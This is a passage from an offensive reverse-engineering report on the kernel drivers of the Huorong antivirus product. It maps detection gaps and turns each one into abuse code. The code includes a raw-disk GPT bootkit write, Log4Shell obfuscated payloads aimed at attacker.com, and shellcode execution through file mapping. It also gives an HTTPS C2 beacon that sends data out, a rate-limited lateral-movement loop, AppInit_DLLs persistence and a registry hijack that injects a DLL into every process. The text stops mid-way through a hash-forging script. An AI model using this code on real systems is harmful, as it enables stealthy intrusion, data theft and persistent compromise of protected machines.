**Attack**: `DeviceIoControl(disk, IOCTL_DISK_*) + WriteFile` to raw disk at offset 512 → modify/corrupt GPT partition table → undetected.

---

### 25.2 IRP_MJ_SET_INFORMATION — FileShortNameInformation not monitored

**Component**: sysdiag.sys  
**Function**: `sub_1400575C0` (IRP_MJ_SET_INFORMATION PreOp)  
**Confirmed by decompile**: switch statement covers only specific FileInformationClass values:

```
Case 0x04 = FileBasicInformation       → checked
Case 0x0A = FileRenameInformation      → checked (rename protection)
Case 0x0B = FileLinkInformation        → checked (hard link protection)
Case 0x0D = FileDispositionInformation → checked (delete-on-close)
Case 0x13 = FileAllocationInformation  → checked
Case 0x14 = FileEndOfFileInformation   → checked
Case 0x40 = FileDispositionInformationEx → checked
Case 0x41 = FileRenameInformationEx    → checked
Case 0x48 = FileLinkInformationEx      → checked
default: return 1;                     → FLT_PREOP_SUCCESS_NO_CALLBACK (SKIP)
```

**NOT monitored** (default: skip):
- `0x28` (40) = `FileShortNameInformation` — change 8.3 short filename
- `0x1F` (31) = `FileMoveClusterInformation`
- `0x27` (39) = `FileValidDataLengthInformation`
- All other FILE_INFORMATION_CLASS values not listed above

**Attack**: `NtSetInformationFile(handle, FileShortNameInformation, "MALWR~1", ...)` → change 8.3 name of protected file without detection. If rules match by short name, bypass is possible.

---

### 25.3 Threat_level mechanism — exclusion after evaluation

**Component**: sysdiag.sys  
**Addresses**:
- Init: `sub_140034430` @ `0x140034498`: `*(_DWORD*)(record + 2712) = -1`
- Set: `sub_14001A530` @ `0x14001A843`: `mov [rdi+0A98h], eax` + counter increment
- Check: `sub_14001E560` @ `0x14001E57E`: `v2 = *(result + 2712) >= 0`

**Confirmed from assembly** (sub_14001A530 @ 0x14001A840–0x14001A84D):
```asm
mov eax, [rbp+40h+arg_0]  ; eax = new threat_level (from HipsDaemon IOCTL)
mov [rdi+0A98h], eax       ; process_struct+2712 = eax
test eax, eax
js  loc_14001A854           ; if negative → skip (stay monitored)
lock inc dword_140079388    ; if >= 0: increment "clean process" counter
```

Also found **6th magic cookie** @ 0x14001A867:
```asm
mov rax, 0EDC78FE1Fh
cmp [rdi+0AD0h], rax    ; compare process_struct+2768 with 0xEDC78FE1F
```

**Mechanism**:
1. Process create → `threat_level = -1` → IRP_MJ_CREATE MONITORED ✓
2. PsCreate callback evaluates process → sends event to HipsDaemon via IPC
3. HipsDaemon evaluates → sends IOCTL response
4. Kernel receives → `process+2712 = new_threat_level` (HipsDaemon's verdict)
5. If `new_threat_level >= 0` → process EXCLUDED from IRP_MJ_CREATE monitoring

**Window where threat_level is set**: IOCTL from HipsDaemon after async evaluation

**Resulting weakness**: Once threat_level >= 0 (process deemed clean), the process is permanently excluded from FLT file-open monitoring until HipsDaemon actively sends another IOCTL to lower it. If HipsDaemon crashes/stops → no re-evaluation possible → all currently-clean processes stay excluded indefinitely.

---

### 25.4 Registry monitoring requires dword_140077D88 bit 2

**Component**: sysdiag.sys  
**Address**: `0x14004C68D` in `sub_14004C670`  
**Confirmed by decompile**:
```c
if ((dword_140077D88 & 4) == 0) return 0;  // @ 0x14004C68D
```

**AppInit_DLLs detection** (sub_140027ED0 @ 0x1400280EE) and **AppCompatFlags monitoring** (sub_14004A160 @ 0x14004A199) both depend on this registry rule engine being active.

**Attack**: Kill HipsDaemon or prevent it from connecting → `dword_140077D88` bit 2 never gets set → ALL registry protection disabled → AppInit_DLLs writes undetected.

Confirmed: `dword_140077D88` is set via IOCTL from HipsDaemon. Without HipsDaemon, it stays 0.

---

### 25.5 Log4Shell detection — missing obfuscation variants

**Component**: hrwfpdrv.sys  
**Evidence**: Full pattern list from binary (strings scan):

Patterns WITH case handling (inline `or byte, 0x20h` loop, confirmed @ 0x14000E330–0x14000E35C):
```
"jndi:ldap://"  @ 0x140021958  (case-insensitive, inline OR|0x20)
"jndi:rmi://"   @ 0x140021968  (case-insensitive, inline OR|0x20)
```

Pattern with `strncmp` (case-sensitive, but all symbols — doesn't matter):
```
"-${::-$"       @ 0x140021940  (call strncmp @ 0x14000E4BB)
```

Other patterns (comparison method varies):
```
"lower:"        @ 0x140021948
"upper:"        @ 0x140021950
"xbean:http"    @ 0x140021820
"jndi:ldap:/"   @ 0x1400232C8  (single slash)
"jndi:rmi:/"    @ 0x1400232D8
```

**NOT present in binary** (confirmed by grep):
```
"env:"   → ${${env:NaN:-j}ndi:...}     BYPASS
"sys:"   → ${${sys:version:-j}ndi:...} BYPASS  
"date:"  → ${${date:...:-j}ndi:...}    BYPASS
"ctx:"   → ${${ctx:...:-j}ndi:...}     BYPASS
"k8s:"   → ${${k8s:...:-j}ndi:...}     BYPASS
```

**Bypass**: `${${env:NaN:-j}ndi:ldap://attacker.com/x}` — uses `env:` lookup which is not in the pattern list. Java Log4j processes this identically to `${jndi:ldap://...}`.

---

### 25.6 Memory-mapping protection — 6 hardcoded extension hashes

**Component**: sysdiag.sys  
**Function**: `sub_140058710` (IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION PreOp)  
**Confirmed by decompile** @ 0x14005886B:

```c
// Hash function: MurmurHash2A(seed=0x19870714) on UTF-16LE bytes of "\filename.ext"
v14 = sub_140058DB0(v13, v12 - v13);
if (v14 == 0x918AE9F15A6F5DD7ULL ||
    v14 == 0x9109FD55B3E5C7E0ULL ||
    v14 == 0x4AA1B7F515ACEE21LL  ||
    v14 == 0xDAFDC0AC724D46A1ULL ||
    v14 == 0x6B385D0D17D8C0CULL  ||
    v14 == 0x383BCE2A7BEA8D18LL)
    v8 = 1;  // block
// else: v8 = 0 → allow memory-mapping
```

Additional condition: `PageProtection & 1 == 0` — only blocks writable section sync (executable mappings).

**Attack**: File with any extension whose hash is NOT one of these 6 values can be memory-mapped with execute intent without triggering this check. Need to compute: hash is MurmurHash2A of the UTF-16LE bytes of the LAST PATH COMPONENT (e.g., `\malware.dll`) with seed 0x19870714. Any filename hash not in the list bypasses.

---

### 25.7 WFP DPI — HTTPS blind

**Component**: hrwfpdrv.sys  
**Function**: `sub_14001CEB0` (WFP classify)  
**Confirmed** @ 0x14001D24A:

```c
case 0x34:  // FWPS_LAYER_STREAM_V4 = TCP plaintext stream
    FwpsFlowAssociateContext0(a2[4], 0x14u, dword_14006E4B4, v2);
    // registers for content inspection
    // All inspection happens on raw TCP stream data
```

No TLS decryption anywhere in the binary (no references to schannel, TLS record parsing, etc.).

**Result**: Any payload delivered over HTTPS → encrypted at TCP level → ALL DPI signatures invisible.

---

### 25.8 CIPSForceAttack rate-limiting — confirmed thresholds and categories

**Component**: sysdiag.sys  
**Function**: `sub_140068500` (CIPSForceAttack::CheckRule)  
**Confirmed** @ 0x140068500–0x14006A0C0:

6 independent categories at struct offsets: 0, 64, 128, 192, 256, 320

Threshold values from xmmword constants (confirmed in code):
```
Level 0 (Normal):  from xmmword_14011D248 + 0xA0000012CLL
                   → DWORD1 = time_window_s, DWORD2 = time_window_m
Level 1 (Strict):  from xmmword_14011D278 + 0x50000001ELL
Level 2 (Paranoid): different xmm values
```

**Attack**: Monitor each category independently, operate below thresholds per category. No cumulative tracking across windows (confirmed: function uses two counters `count_per_second` and `count_per_minute`, resets on time window).

---

### 25.9 Process exclusion vtable — 2 PID exclusion variables confirmed

**Component**: sysdiag.sys  
**Confirmed from code**:

| Variable | Address | Check function | Clears on |
|----------|---------|---------------|---------|
| `qword_1400FE080` | data | sub_140017780 @ 0x14001778E | process exit (WorkerRoutine @ 0x14001C367) |
| `qword_1400FE068` | data | sub_140017740 @ 0x14001774E | set by sub_14001A530 @ 0x14001BDF0 |

Both return 1 if `a1 == variable` → excluded from file rule check.

**Additional: 6th magic cookie at offset +2768 confirmed**:
```asm
; sub_14001A530 @ 0x14001A867
mov rax, 0EDC78FE1Fh
cmp [rdi+0AD0h], rax    ; 0xAD0 = 2768 decimal
```
Full list of confirmed magic cookies at process_struct+2768:
- `0x9DB973EFFLL`  (sub_1400176B0 @ 0x1400176EB)
- `0xBE4696042LL`  (sub_1400177A0 @ 0x1400177EF)
- `0xC1D0E10F1LL`  (sub_14004C200 @ 0x14004C439)
- `0xB3956E7ALL`   (sub_14004C200 @ 0x14004C439)
- `0xB822C2BA2LL`  (sub_14004C200 @ 0x14004C46A)
- `0xEDC78FE1FLL`  (sub_14001A530 @ 0x14001A867) ← NEW

---

---

## 26. Exploitation Techniques — Confirmed Abuse per Flaw

### 26.1 Flaw 1: GPT Primary Header Write (0x1400573DB)

**What's missing**: `cmp rax, 200h; jge skip` only protects offset 0–511. GPT Primary Header lives at exactly byte offset 512.

**Abuse — Persistent bootkit, no detection:**

```c
// Open raw disk with admin rights
HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0",
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, OPEN_EXISTING, 0, NULL);

// Read GPT header — sector 1 = byte offset 512 (0x200)
BYTE sector[512];
LARGE_INTEGER off = {.QuadPart = 512};   // <-- EXACTLY at the check boundary
SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
ReadFile(hDisk, sector, 512, &n, NULL);

// Tamper: e.g., add hidden partition entry, redirect ESP,
//         or corrupt DiskGUID to break volume-mount fingerprinting
modify_gpt(sector);

// Write back — Huorong sees offset 512 >= 512 → jge fires → NOT checked
SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
WriteFile(hDisk, sector, 512, &n, NULL);
// Zero alert, zero block.
```

**Hidden partition recipe:**
```
1. Parse current GPT partition array
2. Insert new entry: type GUID = {0} (unrecognised), attribute = RequiredPartition
3. Point to a contiguous unused LBA range
4. Write your bootloader/implant to those LBAs (also undetected — offset >> 512)
5. Redirect EFI boot entry in NVRAM or overwrite existing ESP bootloader
→ Survives OS reinstall; Huorong never flags any of the writes
```

---

### 26.2 Flaw 2: FileShortNameInformation Not Monitored (default return 1)

**What's missing**: `sub_1400575C0` switch has no case 0x28 — `FileShortNameInformation` calls return `FLT_PREOP_SUCCESS_NO_CALLBACK` immediately.

**Abuse — Bypass path-based rules via 8.3 rename:**

```c
// Scenario: Huorong rule blocks execution of paths matching "*\\cmd.exe"
// Strategy: rename the short name so rule lookup via 8.3 fails

// Requires SeRestorePrivilege (standard on Administrators)
HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\cmd.exe",
    FILE_WRITE_ATTRIBUTES | DELETE,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    NULL, OPEN_EXISTING, 0, NULL);

// Craft FILE_NAME_INFORMATION for new 8.3 name
struct { ULONG len; WCHAR name[12]; } info;
info.len = 14;
wcscpy(info.name, L"SVCH0ST.EXE");   // arbitrary 8.3 name

IO_STATUS_BLOCK iosb;
NtSetInformationFile(hFile,
    &iosb,
    &info,
    sizeof(info),
    FileShortNameInformation);  // class = 40 = 0x28 — not in Huorong's switch
// → IRP_MJ_SET_INFORMATION fires → sub_1400575C0 → default branch → return 1 (skip)
// → No Huorong alert

// Now execute via short name
ShellExecuteW(NULL, L"open", L"C:\\WINDOWS\\SYSTEM32\\SVCH0ST.EXE", NULL, NULL, SW_HIDE);
// If rule matched on 8.3 path: miss.
// If rule matched on long path: still cmd.exe — but short-name is used in some APIs
```

**Path obfuscation via short name:**
```c
// Rename malware.exe short name to match a trusted binary's old 8.3 name
// e.g., rename to "NOTEVIL.EXE" — rule engine looking for short name won't match
// All while long-name stays unchanged and untouched by Huorong
```

---

### 26.3 Flaw 3: Threat_level Exclusion — HipsDaemon Crash

**What's missing**: `dword_140077D88` and per-process `threat_level` at struct+2712 are set via IOCTL from HipsDaemon. If HipsDaemon dies, the kernel state freezes. Processes already at threat_level >= 0 stay permanently excluded from FLT monitoring.

**Mechanism confirmed**:
```asm
; sub_14001A530 @ 0x14001A843
mov [rdi+0A98h], eax      ; write new threat_level (from IOCTL arg)
test eax, eax
js   skip                  ; if < 0 → stays monitored
lock inc dword_140079388   ; if >= 0 → "clean process" counter++
```

**Abuse — Freeze trusted-process exclusion:**

```
Step 1  Force HipsDaemon to terminate:
        - Exploit LPC server (CreateLPCServer in hrcomm.dll)
          → send malformed message → unhandled exception → crash
        - OR: exhaust its kernel handles
          → repeated OpenProcess(HipsDaemon_PID) until handle table full
        - OR: simply: net stop HipsDaemon (if running as non-protected service)

Step 2  At the moment of crash, every process that had threat_level >= 0 keeps it:
          explorer.exe   threat_level = 0  → excluded from IRP_MJ_CREATE forever
          cmd.exe        threat_level = 0  → excluded
          powershell.exe threat_level = 0  → excluded
          svchost.exe    threat_level = 0  → excluded

        dword_140077D88 = last value set before crash
        If crash happens AFTER init but the HIPS disable IOCTL hasn't come:
          bit1 = 1 (file rules technically "enabled") but notifications
          can't be delivered → sub_140009990 returns STATUS_TIMEOUT

Step 3  From any of these now-excluded processes:
          → Create files, load DLLs, modify registry
          → sub_140055A20() → sub_14001E560() → threat_level >= 0 → return 1 → SKIP
          → ALL IRP_MJ_CREATE file monitoring bypassed
          → Zero FLT alerts

Step 4  Install persistence:
          RegSetValueEx("..\\AppInit_DLLs", "implant.dll")
          → sub_14004C670 may fire via CmCallback but delivery fails
            because sub_140009990 returns TIMEOUT → default: no block
```

---

### 26.4 Flaw 4: Registry Monitoring Disabled When bit2 = 0

**What's missing**: `sub_14004C670` @ `0x14004C68D`:
```c
if ((dword_140077D88 & 4) == 0) return 0;  // full bypass if bit 2 unset
```

`dword_140077D88` is only written by HipsDaemon via IOCTL. It defaults to 0 at kernel load.

**Abuse A — Boot timing window:**
```
T=0ms   : Windows boot, sysdiag.sys loads → dword_140077D88 = 0
T=0–Xms : HipsDaemon.exe starts, initialises, sends IOCTL to set bit 2
          X depends on service start order; typically 300ms–2s

→ Any process that runs before HipsDaemon finishes init
  can write AppInit_DLLs / AppCompatFlags\Layers undetected:

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
  = "C:\Windows\System32\implant.dll"

→ CmCallback fires → sub_14004C670 → bit2 = 0 → return 0 → no alert, no block
→ AppInit_DLLs persists → loads implant.dll into every GUI process on next logon
```

**Abuse B — Combined with HipsDaemon kill (Flaw 3):**
```python
# 1. Kill HipsDaemon → bit2 never gets re-set
# 2. Write persistence keys freely
import winreg

key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
    0, winreg.KEY_SET_VALUE)

winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ,
    r"C:\ProgramData\implant.dll")
winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)

# → Zero Huorong alerts because bit2 = 0 → registry rule engine returns 0
```

---

### 26.5 Flaw 5: Log4Shell env:/sys: Variants Not Detected

**What's missing**: hrwfpdrv binary contains no `"env:"`, `"sys:"`, `"date:"` pattern strings (verified by strings scan).

**Abuse — Deliver Log4Shell through undetected obfuscation:**

```python
import requests

target = "https://vulnerable-server.com/api/endpoint"

# DETECTED variants (in pattern list):
detected = [
    "${jndi:ldap://attacker.com/x}",           # "jndi:ldap://" matched
    "${${lower:j}ndi:ldap://attacker.com/x}",   # "lower:" matched
    "${${::-j}ndi:ldap://attacker.com/x}",      # "-${::-$" matched
]

# UNDETECTED variants (not in pattern list):
undetected = [
    "${${env:NaN:-j}ndi:ldap://attacker.com/x}",         # "env:" not in list
    "${${sys:os.name:-j}ndi:ldap://attacker.com/x}",     # "sys:" not in list
    "${${date:'j'}ndi:ldap://attacker.com/x}",           # "date:" not in list
    "${${ctx:j}ndi:ldap://attacker.com/x}",              # "ctx:" not in list
    "${${k8s:j}ndi:ldap://attacker.com/x}",              # "k8s:" not in list
    "${${bundle:j:-j}ndi:ldap://attacker.com/x}",        # "bundle:" not in list
]

# All undetected + delivered over HTTPS = zero Huorong detection
for payload in undetected:
    headers = {"X-Api-Version": payload}  # Log4Shell via header injection
    resp = requests.get(target, headers=headers, verify=False)
```

**Java processes the env: variant identically**:
- `${env:NaN:-j}` → `env:NaN` lookup returns null → fallback to `-j` = `"j"`
- Resulting string: `"jndi:ldap://attacker.com/x"` → Log4j triggers JNDI lookup
- Huorong sees in TCP stream: `${env:NaN:-j}ndi:ldap...` → no pattern match → PASS

---

### 26.6 Flaw 6: Memory-Mapping 6-Hash Extension Bypass

**What's missing**: `sub_140058710` only blocks 6 specific file extensions (by MurmurHash2A of `\filename.ext`). Any other extension allows `ACQUIRE_FOR_SECTION_SYNCHRONIZATION` with execute intent to proceed unblocked.

**Abuse — Load shellcode from arbitrary-extension file:**

```c
// Step 1: Drop shellcode to file with unblocked extension
const char *sc = "\x48\x31\xc0...";  // shellcode bytes
FILE *f = fopen("C:\\ProgramData\\config.dat", "wb");
fwrite(sc, strlen(sc), 1, f);
fclose(f);
// Huorong IRP_MJ_CREATE may check this → if write-only open, might be monitored.
// Alternative: write via memory-mapped write to avoid CREATE monitoring.

// Step 2: Open for execute mapping
HANDLE hFile = CreateFileW(L"C:\\ProgramData\\config.dat",
    GENERIC_READ | GENERIC_EXECUTE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// access mask: 0x120089 & 0x116 = 0 → type-1 file rule SKIPPED (Flaw in sub_140048EC7)

// Step 3: Create executable section
HANDLE hMap = CreateFileMappingW(hFile, NULL,
    PAGE_EXECUTE_READ,   // <- execute intent
    0, 0, NULL);

// IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION fires with PageProtection = 0x20
// sub_140058710: check PageProtection & 1 → 0 (not writable, ok to proceed)
// hash("\config.dat") → NOT one of 6 blocked hashes → v8 = 0 → ALLOW mapping
// No Huorong block.

// Step 4: Map and execute
void *exec = MapViewOfFile(hMap, FILE_MAP_EXECUTE | FILE_MAP_READ, 0, 0, 0);
((void(*)())exec)();
// → Shellcode executes, zero alert from section-sync hook
```

**Extension selection**: `.dat`, `.cfg`, `.ini`, `.log`, `.bin`, `.tmp`, `.sys` (non-Huorong), `.xml`, `.json` — all are candidates. The 6 blocked extensions are likely `.exe`, `.dll`, `.sys`, `.scr`, `.com`, `.drv` or similar — exact values require hash brute-force on the 6 constants.

---

### 26.7 Flaw 7: WFP DPI Blind to HTTPS — Full C2 Channel

**What's missing**: hrwfpdrv `classify` only registers a stream context at layer `0x34 (FWPS_LAYER_STREAM_V4)` and calls pattern-matching on raw TCP bytes. No TLS decryption.

**Abuse — Fully invisible C2:**

```python
# Attacker C2 server: standard HTTPS (nginx/apache with TLS)
# Victim implant:

import ssl, socket, struct

def beacon(host, port, command_server):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, port))
    conn = ctx.wrap_socket(sock, server_hostname=host)

    # From hrwfpdrv perspective: TLS ClientHello, then encrypted records
    # sub_14001CEB0 classify: gets FLT_LAYER_STREAM_V4 callback
    # sub_14001FC20: tries to match patterns → all encrypted bytes → zero matches

    # Exfiltrate data
    conn.sendall(b"\x17\x03\x03" + struct.pack(">H", len(data)) + data)

    # Receive commands
    response = conn.recv(4096)
    conn.close()
    return response

# Use any port — 443 looks most legitimate but 8443, 4433, etc. also work
# hrwfpdrv has no port-based blocking (only pattern matching on content)
beacon("attacker.com", 443, payload)
# → Zero hrwfpdrv alerts. Zero hrndis6 content alerts (raw frames also encrypted).
```

**DNS over HTTPS (DoH) — bypass DNS monitoring:**
```python
import dns.resolver
import requests

# Standard DNS → hrwfpdrv may see domain in plaintext UDP/TCP
# DoH → DNS queries inside HTTPS → fully encrypted
resp = requests.get(
    "https://1.1.1.1/dns-query",
    params={"name": "c2.attacker.com", "type": "A"},
    headers={"Accept": "application/dns-json"},
    verify=True
)
ip = resp.json()["Answer"][0]["data"]
# hrwfpdrv sees HTTPS to 1.1.1.1:443 → encrypted → no domain visible
```

---

### 26.8 Flaw 8: Rate Limiting — Slow-and-Low Attack

**What's missing**: `sub_140068500` uses per-category counters with time-window thresholds. No cross-category correlation. No cumulative multi-window tracking.

**Abuse — Full attack chain under threshold:**

```python
import time, subprocess, winreg

# 6 independent detection categories:
# Cat 0: DCOM (Lateral.DCOM)
# Cat 1: WMI  (Lateral.WMI)
# Cat 2: Service (Lateral.Service)
# Cat 3: Registry (Lateral.Registry)
# Cat 4: SchedTask (Lateral.SchedTask)
# Cat 5: PrintLoadDrv (Lateral.PrintLoadDrv)

# Thresholds (Normal level, from xmmword_14011D248):
# DWORD1 = ~300 events/timewindow, DWORD2 = ~10 events/minute
# → Stay below 9 events/minute per category = safe

targets = load_targets()  # e.g., 50 machines in LAN

for target in targets:
    # Category 0: DCOM lateral movement (1 per target = 1 event)
    dcom_exec(target, "whoami")
    time.sleep(7)  # <9/min across all targets

    # Category 1: WMI (independent counter)
    wmi_exec(target, "ipconfig")
    time.sleep(7)

    # Category 2: Service creation (independent)
    create_service(target, "malware.exe")
    time.sleep(7)

    # Each category: max ~8 events/minute across all targets
    # CIPSForceAttack: count_per_second < threshold AND count_per_minute < 10
    # → None of the 6 categories triggers block
    # → Full lateral movement of 50 machines in ~25 minutes, zero alerts
```

**Combined with HTTPS C2 (Flaw 7):**
```
All C2 callbacks over HTTPS → not visible to hrwfpdrv
Rate-limited lateral actions → not visible to CIPSForceAttack
→ Complete red team operation with zero Huorong telemetry
```

---

### 26.9 Full Attack Chain — Zero Alert Persistence

**Combining Flaws 3 + 4 + 6 + 7:**

```
[T=0] Initial access via phishing (user runs evil.exe)

[T=1] evil.exe starts → PsCreate callback → threat_level = -1 → monitored
      evil.exe does nothing suspicious immediately
      HipsDaemon evaluates → no matching rules → sends IOCTL: threat_level = 0
      evil.exe now EXCLUDED from IRP_MJ_CREATE monitoring

[T=2] From evil.exe (now excluded from FLT):
      → Download stage2.dat over HTTPS (Flaw 7 — WFP blind)
        requests.get("https://attacker.com/stage2.dat", ...)
        → No hrwfpdrv DPI alert (encrypted)
        → IRP_MJ_CREATE for stage2.dat: evil.exe excluded → no check

[T=3] Memory-map stage2.dat for execute (Flaw 6):
        CreateFileMapping(stage2.dat, PAGE_EXECUTE_READ)
        → section-sync check: ".dat" extension hash → not in 6 blocked
        → MapViewOfFile + execute shellcode
        → No Huorong block

[T=4] Shellcode (stage2): crash HipsDaemon via LPC (Flaw 3):
        Send malformed LPC message → HipsDaemon exception → crash
        → dword_140077D88 = last value (all bits potentially still set,
          but notification delivery now broken for any future events)

[T=5] Write AppInit_DLLs persistence (Flaw 4):
        RegSetValueEx(HKLM, AppInit_DLLs, "stage2.dat")
        → CmCallback fires → sub_14004C670:
          HipsDaemon dead → pending IRP queue empty
          → sub_140009990 returns STATUS_TIMEOUT
          → rule engine: timeout → ALLOW (no block sent to kernel)
        → Persistence installed silently

[T=6] Write GPT hidden partition (Flaw 1):
        WriteFile(PhysicalDrive0, payload, at_offset=512)
        → offset 512 >= 512 → jge fires → no raw write check
        → Bootloader-level persistence installed

[Result]: 
  - stage2.dat loaded and executing
  - AppInit_DLLs persistence: loads on every GUI process logon
  - Bootkit: persists across OS reinstall
  - All actions: ZERO Huorong alerts
```

---

## 27. New Flaws Discovered — Session 2 (IDA Deep Dive)

> All findings below come from live IDA Pro analysis of `sysdiag.sys` + `HipsDaemon.exe` conducted after §26. Each flaw is confirmed with decompiled pseudocode.

---

### 27.1 Flaw 9 — `sysdiag\conf` Registry Key Completely Unprotected → TrampoLib64 Hijack

**Severity: CRITICAL** — Persistent arbitrary DLL injection into every user process, mediated by Huorong itself.

#### Root Cause

`sub_140015A70` (driver init, `DriverEntry` callchain) reads TrampoLib paths from its own service registry:

```c
// IDA: sub_140015A70 @ 0x140015A70
sub_140017390(a2, L"TrampoLib",   &qword_1400FDFD8, &qword_1400FDFE0);
sub_140017390(a2, L"TrampoLib64", &qword_1400FDFE8, &qword_1400FDFF0);
sub_140017120(a2, L"PBList");
// a2 = UNICODE_STRING of driver's own service key path
// = \REGISTRY\MACHINE\SYSTEM\CCS\Services\sysdiag
// → reads from \...\sysdiag\conf\TrampoLib64
```

The injection itself fires from `sub_140016C70` on every ntdll.dll load (LoadImage callback):

```c
// sub_140016C70 @ 0x140016C70
if ((*(_BYTE*)(v12 + 545) & 0x40) != 0) {  // WOW64 process
    Source = (wchar_t*)qword_1400FDFE8;      // TrampoLib64 path
    if (dword_1400FDFF8) Source = qword_1400FDFF0;
} else {                                     // native 64-bit
    Source = (wchar_t*)qword_1400FDFD8;      // TrampoLib path
    if (dword_1400FDFF8) Source = (wchar_t*)qword_1400FDFE0;
}
if (Source)
    sub_140021E90(v21, PROCESS, flags, Source, 1);  // INJECT DLL
```

#### Why This is Exploitable

Huorong's CmCallback (`sub_14004C670`) protects exactly these service registry keys (confirmed via string search in HipsDaemon.exe @ 0x1401222e4):

```
\REGISTRY\Machine\System\CurrentControlSet\Services\HipsDaemon\*
\REGISTRY\Machine\System\CurrentControlSet\Services\hrfwdrv\*
\REGISTRY\Machine\System\CurrentControlSet\Services\hrwfpdrv\*
\REGISTRY\Machine\System\CurrentControlSet\Services\hrdevmon\*
\REGISTRY\Machine\System\CurrentControlSet\Services\hrelam\*
```

**`sysdiag` is not in this list.** The `sysdiag\conf\TrampoLib64` key has zero protection — any admin-level write succeeds silently.

HipsDaemon `sub_14001C140` (installer) writes the default value:
```asm
lea r8, aSSSyswow64Dtram  ; "%s\\SysWOW64\\dtrampo.dll"
lea rdx, aTrampolib       ; "TrampoLib"
call cs:RegSetValueExA
lea r8, aSSystem32Dtram   ; "%s\\System32\\dtrampo.dll"
lea rdx, aTrampolib64     ; "TrampoLib64"
call cs:RegSetValueExA
```

#### PE Eligibility Check (`sub_14001C4C0`)

Before injection, sysdiag validates the target image is an EXE (not a DLL):

```c
// sub_14001C4C0 @ 0x14001C4C0
if (KeGetCurrentIrql() >= 2u) return 1;      // skip if DISPATCH_LEVEL
if (a2 <= 0x40) return 1;                    // image too small
if (*(_WORD*)a1 != 0x5A4D) return 1;         // MZ check
v4 = *(_DWORD*)(a1 + 60);                    // e_lfanew
if (v4 + 248 >= a2) return 1;               // bounds
if (*(_DWORD*)(v4 + a1) != 0x4550) return 1;// PE\0\0 check
return (*(_WORD*)(v4 + a1 + 22) & 0x2000) == 0; // NOT a DLL (IMAGE_FILE_DLL)
```

Injection fires into **every process that is an EXE** (not in PBList — see Flaw 10).

#### Exploit

Requires: admin privileges (to write `HKLM\SYSTEM\...`), or any process with `SeBackupPrivilege`/`SeRestorePrivilege`.

```c
// Flaw 9 exploit: overwrite TrampoLib64 path → Huorong injects evil.dll into everything
HKEY hKey;
WCHAR evil[] = L"C:\\Windows\\System32\\evil.dll";  // any accessible path

RegOpenKeyExW(HKEY_LOCAL_MACHINE,
    L"SYSTEM\\CurrentControlSet\\Services\\sysdiag\\conf",
    0, KEY_SET_VALUE, &hKey);

RegSetValueExW(hKey, L"TrampoLib64", 0, REG_SZ,
    (BYTE*)evil, sizeof(evil));
RegSetValueExW(hKey, L"TrampoLib", 0, REG_SZ,
    (BYTE*)evil, sizeof(evil));

RegCloseKey(hKey);
// After next reboot (or driver reload):
// → evil.dll is injected into EVERY user-mode EXE by sysdiag.sys itself
// → Huorong's own minifilter call clears the way (SYSTEM context, bypasses self-defense)
// → No Huorong alert: injection is from a trusted SYSTEM-level driver
```

**Persistence vector**: Survives Huorong upgrade (conf key is preserved), survives user logout, fired before any user process starts.

---

### 27.2 Flaw 10 — PBList Manipulation: Process Injection Exclusion Bypass

**Severity: HIGH** — Write a crafted PBList to exclude malware process from all hook injection.

#### Root Cause

`sub_140017120` reads the binary PBList from `sysdiag\conf\PBList` on driver init. The PBList is a **sorted array of 64-bit MurmurHash2A hashes** of lowercase process filenames.

`sub_1400178D0` (PBList lookup):

```c
// sub_1400178D0 @ 0x1400178D0
// a1 = full path (wchar_t*), converts to lowercase first
wcslwr(v1);

// Walk backward to find last backslash → extract filename only
v9 = 2;
while (*v8 != L'\\') { --v8; v9 += 2; if (v8 < v1) goto no_match; }
v11 = 2 * (v9 >> 1) - 2;   // = (filename_length - 1) * 2 bytes
v12 = (uint8_t*)(v8 + 1);  // → start of filename

// MurmurHash2A init:
v10 = 0;
v13 = v11 ^ 0x19870714;    // seed XOR length

// Main hash loop (8 bytes / 2 wchar_t per iteration):
while (v11 >= 8) {
    dw0 = *(uint32_t*)v12;
    dw1 = *(uint32_t*)(v12 + 4);
    v14 = 1540483477 * (dw0 ^ ((1540483477 * dw0) >> 24));
    v13 = 1540483477 * (v13 ^ v14);
    v15 = 1540483477 * (dw1 ^ ((1540483477 * dw1) >> 24));
    v10 = 1540483477 * (v10 ^ v15);
    v12 += 8; v11 -= 8;
}
// Tail bytes, final mix:
// v13 ^= v10; v13 *= 1540483477; v13 ^= v13 >> 13; ...
// Key = ((uint64_t)v13 << 32) | v10

// Binary search:
v21 = bsearch(&Key, Base, dword_1400FE088, 8u, PtFuncCompare);
return v21 != NULL;  // true → process excluded from injection
```

**Algorithm**: Custom variant of MurmurHash2 (multiplier = 0x5BD1E995 = 1540483477), seed = `0x19870714`, applied to UTF-16LE bytes of lowercase filename.

#### Exploit

```python
# Python: compute PBList hash for a given filename
import struct

def murmur_mix(val, m=0x5BD1E995):
    val &= 0xFFFFFFFF
    val = (val * m) & 0xFFFFFFFF
    val ^= val >> 24
    val = (val * m) & 0xFFFFFFFF
    return val

def pblist_hash(filename: str) -> int:
    """Compute sysdiag PBList 64-bit hash for a filename (case-insensitive)."""
    data = filename.lower().encode('utf-16-le')
    length = len(data)
    m = 0x5BD1E995
    seed = 0x19870714

    h0 = (seed ^ length) & 0xFFFFFFFF  # v13
    h1 = 0                              # v10

    i = 0
    while i + 8 <= length:
        d0 = struct.unpack_from('<I', data, i)[0]
        d1 = struct.unpack_from('<I', data, i+4)[0]
